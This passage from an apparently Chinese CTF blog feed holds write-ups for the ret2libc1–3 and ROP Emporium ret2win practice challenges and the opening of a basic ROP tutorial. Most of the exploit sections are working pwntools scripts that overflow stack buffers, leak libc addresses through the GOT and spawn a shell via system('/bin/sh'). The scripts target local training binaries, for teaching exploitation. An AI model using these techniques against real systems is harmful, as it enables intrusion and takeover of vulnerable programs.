system 函数存在。</p><p><img src="/2022/09/18/ret2libc/image-20220915163027797.png" alt="image-20220915163027797"></p><p>那么我们直接返回 system 处，即执行 system 函数。相应的 payload 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ret2libc1.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x08048720</span></span><br><span class="line">system_plt = <span class="number">0x08048460</span></span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span> * <span class="number">112</span>, system_plt, <span class="string">b&#x27;b&#x27;</span> * <span class="number">4</span>, binshaddr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以’bbbb’ 作为虚假的地址，其后参数对应的参数内容。</p><p>这个例子相对来说简单，同时提供了 system 地址与 /bin/sh 的地址，但是大多数程序并不会有这么好的情况。</p><p><img src="/2022/09/18/ret2libc/image-20220915162822205.png" alt="image-20220915162822205"></p><h1 id="ret2libc2"><a class="markdownIt-Anchor" href="#ret2libc2"></a> ret2libc2</h1><h2 id="0x1-2"><a class="markdownIt-Anchor" href="#0x1-2"></a> 0x1</h2><p>该题目与 ret2libc1 基本一致，只不过不再出现 /bin/sh 字符串，所以此次需要我们自己来读取字符串，所以**我们需要两个 gadgets，第一个控制程序读取字符串，第二个控制程序执行 system(&quot;/bin/sh&quot;)。**由于漏洞与上述一致，这里就不在多说。</p><p><img src="/2022/09/18/ret2libc/image-20220915163514956.png" alt="image-20220915163514956"></p><p><img src="/2022/09/18/ret2libc/image-20220915163926447.png" alt="image-20220915163926447"></p><p><img src="/2022/09/18/ret2libc/image-20220915164247643.png" alt="image-20220915164247643"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gets_plt = <span class="number">0x08048460</span></span><br><span class="line">system_plt = <span class="number">0x08048490</span></span><br><span class="line">pop_ebx = <span class="number">0x0804843d</span></span><br><span class="line">buf2 = <span class="number">0x804a080</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">b&#x27;a&#x27;</span> * <span class="number">112</span>, gets_plt, pop_ebx, buf2, system_plt, <span class="number">0xdeadbeef</span>, buf2])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2022/09/18/ret2libc/image-20220915164417103.png" alt="image-20220915164417103"></p><h1 id="ret2libc3"><a class="markdownIt-Anchor" href="#ret2libc3"></a> ret2libc3</h1><h2 id="0x1-3"><a class="markdownIt-Anchor" href="#0x1-3"></a> 0x1</h2><p>在例 ret2libc2 的基础上，再次将 system 函数的地址去掉。此时，我们需要同时找到 system 函数地址与 /bin/sh 字符串的地址。首先，查看安全保护。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/下载/ret2libc/ret2libc3$ file ret2libc3</span><br><span class="line">ret2libc3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=c0ad441ebd58b907740c1919460c37bb99bb65df, with debug_info, not stripped</span><br><span class="line">sakura@Kylin:~/下载/ret2libc/ret2libc3$ checksec ret2libc3</span><br><span class="line">[*] &#x27;/home/sakura/下载/ret2libc/ret2libc3/ret2libc3&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>可以看出，源程序仍旧开启了堆栈不可执行保护。进而查看源码，发现程序的 bug 仍然是栈溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No surprise anymore, system disappeard QQ.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Can you find it !?&quot;</span>);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x2-2"><a class="markdownIt-Anchor" href="#0x2-2"></a> 0x2</h2><p>那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点</p><ul><li>system 函数属于 libc，而 <a href="http://libc.so">libc.so</a> 动态链接库中的函数之间相对偏移是固定的。</li><li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下</li><li><a href="https://github.com/niklasb/libc-database">https://github.com/niklasb/libc-database</a></li></ul><p>所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。</p><p>那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。<strong>当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong></p><p>我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme</p><ul><li><a href="https://github.com/lieanu/LibcSearcher">https://github.com/lieanu/LibcSearcher</a></li></ul><blockquote>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型</span></span><br><span class="line">obj = LibcSearcher(<span class="string">&quot;fgets&quot;</span>, <span class="number">0X7ff39014bd90</span>)</span><br><span class="line"></span><br><span class="line">obj.dump(<span class="string">&quot;system&quot;</span>)        <span class="comment">#system 偏移</span></span><br><span class="line">obj.dump(<span class="string">&quot;str_bin_sh&quot;</span>)    <span class="comment">#/bin/sh 偏移</span></span><br><span class="line">obj.dump(<span class="string">&quot;__libc_start_main_ret&quot;</span>)    </span><br></pre></td></tr></table></figure><p>如果遇到返回多个libc版本库的情况，可以通过<code>add_condition(leaked_func, leaked_address)</code>来添加限制条件，也可以手工选择其中一个libc版本（如果你确定的话）。</p></blockquote><p>此外，在得到 libc 之后，其实 libc 中也是有 /bin/sh 字符串的，所以我们可以一起获得 /bin/sh 字符串的地址。</p><hr><p><strong><a href="https://www.cnblogs.com/wgf4242/p/13091061.html">溢出思路总结</a></strong></p><p>1、泄露一个ret2libc3函数的位置</p><p>2、获取libc的版本(只有被执行过的函数才能获取地址)</p><p>①<a href="https://libc.blukat.me/">https://libc.blukat.me</a></p><p>②LibcSearcher: <a href="https://github.com/lieanu/LibcSearcher">https://github.com/lieanu/LibcSearcher</a></p><p>3、根据偏移获取shell和sh的位置</p><p>①求libc基地址(函数动态地址一函数偏移量)</p><p>②求其他函数地址(基地址+函数偏移量)</p><p>4、执行程序获取shell</p><hr><p>这里我们泄露 __libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下</p><ul><li>泄露 __libc_start_main 地址</li><li>获取 libc 版本</li><li>获取 system 地址与 /bin/sh 的地址</li><li>再次执行源程序</li><li>触发栈溢出执行 system(‘/bin/sh’)</li></ul><p>exp 如下：</p><p>1、手动获取libc基地址</p><p>这里面需要用到三个offset，分别为system、puts和sh，可以用 <a href="https://libc.blukat.me">libc database search</a> 网站来获取 libc 基地址</p><p><img src="/2022/09/18/ret2libc/image-20220916221437793.png" alt="image-20220916221437793"></p><p>也可以用指令获取：(注意是 IO_puts，之前我一直搜 puts 的地址，结果做不出来)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">strings /lib/i386-linux-gnu/libc.so.6 -tx | grep &quot;bin/sh&quot;</span><br><span class="line">readelf -a /lib/i386-linux-gnu/libc.so.6| grep &quot;IO_puts&quot;</span><br><span class="line">readelf -a /lib/i386-linux-gnu/libc.so.6| grep &quot;system&quot;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ret2libc3_auto.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line">ret2libc3 = ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = ret2libc3.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = ret2libc3.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;ready leak libc...&quot;</span>)</span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span> * <span class="number">112</span>, puts_plt, main, puts_got])</span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;Can you find it !?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;get the related addr&quot;</span>)</span><br><span class="line">puts_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts:&quot;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libcbase = puts_addr - <span class="number">0x071cd0</span></span><br><span class="line">system_addr = libcbase + <span class="number">0x045830</span></span><br><span class="line">binsh_addr = libcbase + <span class="number">0x192352</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;ready get shell&quot;</span>)</span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span> * <span class="number">104</span>, system_addr, <span class="number">0xdeadbeef</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2022/09/18/ret2libc/image-20220916220159305.png" alt="image-20220916220159305"></p><p>2、利用工具自动获取libc基地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ret2libc3_auto.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">ret2libc3 = ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line">gdb.attach(sh, <span class="string">&quot;break main&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_got = ret2libc3.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = ret2libc3.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;leak puts_got addr and return to main again&quot;</span>)</span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span> * <span class="number">112</span>, puts_plt, main, puts_got])</span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;Can you find it !?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;ready leak libc...&quot;</span>)</span><br><span class="line">puts_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_addr: &quot;</span>+ <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;_IO_puts&#x27;</span>, puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">&#x27;_IO_puts&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libcbase: &quot;</span>, <span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>) <span class="comment">#0x04fa50</span></span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>) <span class="comment"># 0x1abf05</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system: &quot;</span>+ <span class="built_in">hex</span>(system_addr)+<span class="string">&quot;\n&quot;</span>+<span class="string">&quot;binsh:&quot;</span> + <span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;get shell&quot;</span>)</span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span> * <span class="number">112</span>, system_addr, <span class="number">0xdeadbeef</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2022/09/18/ret2libc/image-20220916221028464.png" alt="image-20220916221028464"></p><blockquote><p>参考：</p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#1">ROP</a></p><p><a href="https://blog.csdn.net/weixin_43363675/article/details/118056125">Stackoverflow Lab006: ret2libc3</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow&quot;&gt;题目地址&lt;/a&gt; ret2libc&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 i</summary>
      
    
    
    
    <category term="CTF" scheme="https://www.rgzzplus.com/categories/CTF/"/>
    
    
    <category term="ret2libc" scheme="https://www.rgzzplus.com/tags/ret2libc/"/>
    
  </entry>
  
  <entry>
    <title>ret2win</title>
    <link href="https://www.rgzzplus.com/2022/09/18/ret2win/"/>
    <id>https://www.rgzzplus.com/2022/09/18/ret2win/</id>
    <published>2022-09-18T02:24:30.000Z</published>
    <updated>2022-09-18T02:30:15.432Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>题目地址：<a href="https://ropemporium.com/challenge/ret2win.html">ret2win</a></p></blockquote><h2 id="0x1"><a class="markdownIt-Anchor" href="#0x1"></a> 0x1</h2><p>拿到题目后，首先检查一下文件类型，看看保护机制。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/下载/ret2win$ file ret2win</span><br><span class="line">ret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=19abc0b3bb228157af55b8e16af7316d54ab0597, not stripped</span><br><span class="line">sakura@Kylin:~/下载/ret2win$ checksec ret2win</span><br><span class="line">[*] &#x27;/home/sakura/下载/ret2win/ret2win&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>它是一个 64 位的程序，可以看到只开启了 NX。要想绕过它，就要运用 ROP 技术了。</p><h2 id="0x2"><a class="markdownIt-Anchor" href="#0x2"></a> 0x2</h2><p>再把它拖进 IDA 看看。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ret2win by ROP Emporium&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;x86_64\n&quot;</span>);</span><br><span class="line">  pwnme();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nExiting&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pwnme</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What could possibly go wrong?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You there, may I have your input please? And don&#x27;t worry about null bytes, we&#x27;re using read()!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x38</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们发现了一个 ret2win() 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ret2win</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Well done! Here&#x27;s your flag:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/cat flag.txt&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/09/18/ret2win/image-20220912214133774.png" alt="image-20220912214133774"></p><p>这里能打印出  flag.txt ，所以我们就通过将返回地址覆盖为 0x400756，来调用这个函数。</p><p>先来看看，需要填充多少字符才能覆盖到返回地址。</p><p>老规矩启用 peda，<code>pattern create 200</code> ，调试到 <code>ret</code> 指令，此时栈的情况如下：<br><img src="/2022/09/18/ret2win/image-20220912215027379.png" alt="image-20220912215027379"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pattern offset AA0AAFAAbAA1AAGA</span><br><span class="line">AA0AAFAAbAA1AAGA found at offset: 40</span><br></pre></td></tr></table></figure><h2 id="0x3"><a class="markdownIt-Anchor" href="#0x3"></a> 0x3</h2><p>构建脚本 <a href="http://ret2win.py">ret2win.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./ret2win&quot;</span>)</span><br><span class="line">gdb.attach(p, <span class="string">&quot;break main&quot;</span>)</span><br><span class="line">bin_addr = <span class="number">0x400756</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span> + p64(bin_addr)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;already...&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;send payload after...&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Here&#x27;s your flag: &quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line">success(flag)</span><br></pre></td></tr></table></figure><p>我在本地测试时，碰到了下面这个问题，查资料 <a href="https://www.freesion.com/article/3772838918/">本地测试碰到的问题及其解决方法</a> 说是栈操作导致无法对齐 0x10 的原因。</p><p><img src="/2022/09/18/ret2win/image-20220912232441944.png" alt="image-20220912232441944"></p><p>将 <a href="http://ret2win.py">ret2win.py</a> 的 bin_addr = 0x40075a 跳过栈操作，即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./ret2win&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p, &quot;break main&quot;)</span></span><br><span class="line">bin_addr = <span class="number">0x40075a</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span> + p64(bin_addr)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="comment">#input(&quot;already&quot;)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#input(&quot;send payload after&quot;)</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Here&#x27;s your flag:\n&quot;</span>)</span><br><span class="line">flag=p.recvline()</span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>结果：</p><p><img src="/2022/09/18/ret2win/image-20220912233639670.png" alt="image-20220912233639670"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;题目地址：&lt;a href=&quot;https://ropemporium.com/challenge/ret2win.html&quot;&gt;ret2win&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x1&quot;&gt;&lt;a class=&quot;markdownI</summary>
      
    
    
    
    <category term="CTF" scheme="https://www.rgzzplus.com/categories/CTF/"/>
    
    
    <category term="ret2win" scheme="https://www.rgzzplus.com/tags/ret2win/"/>
    
  </entry>
  
  <entry>
    <title>基本ROP</title>
    <link href="https://www.rgzzplus.com/2022/09/18/%E5%9F%BA%E6%9C%ACROP/"/>
    <id>https://www.rgzzplus.com/2022/09/18/%E5%9F%BA%E6%9C%ACROP/</id>
    <published>2022-09-18T02:24:07.000Z</published>
    <updated>2022-09-19T07:53:55.820Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基本-rop"><a class="markdownIt-Anchor" href="#基本-rop"></a> 基本 ROP</h1><h2 id="rop-简介"><a class="markdownIt-Anchor" href="#rop-简介"></a> ROP 简介</h2><p>最开始，只需将函数返回地址覆盖为 jmp esp 指令的地址，然后在后面添加 shellcode 就可以执行。后来引入了 NX 机制，数据所在内存页被标记为不可执行，此时再执行 shellcode 就会抛出异常。既然注入的代码不行，那就复用程序中已有的代码。</p><p>有以下一些概念：</p><p>/1. rop：<strong>返回导向编程（Return Oriented Programming），在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong></p><p>/2. gadgets：在程序中的指令片段，有时我们为了达到我们执行命令的目的，需要多个gadget来完成我们的功能。gadget最后一般都有ret，因为我们需要将程序控制权(EIP)给下一个gadget。即让程序自动持续的选择堆栈中的指令依次执行。</p><p>/3. ropgadgets：一个pwntools的一个命令行工具，用来具体寻找gadgets的。例如：我们从pop、ret序列当中寻找其中的eax<br><code>ROPgadget --binary ./7.exe --only &quot;pop|ret&quot; | grep &quot;eax&quot;</code></p><p>/4. 在linux系统中，函数的调用是有一个系统调用号的。例如execve(&quot;/bin/sh&quot;,null,null)函数其系统调用号是59，即十六进制0x3b。</p><p>之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</p><ul><li>程序存在溢出，并且可以控制返回地址。</li><li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li></ul><p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</p><h2 id="寻找-gadgets"><a class="markdownIt-Anchor" href="#寻找-gadgets"></a> 寻找 gadgets</h2><p>/1. 在程序中寻找所有的 c3（ret） 字节</p><p>/2. 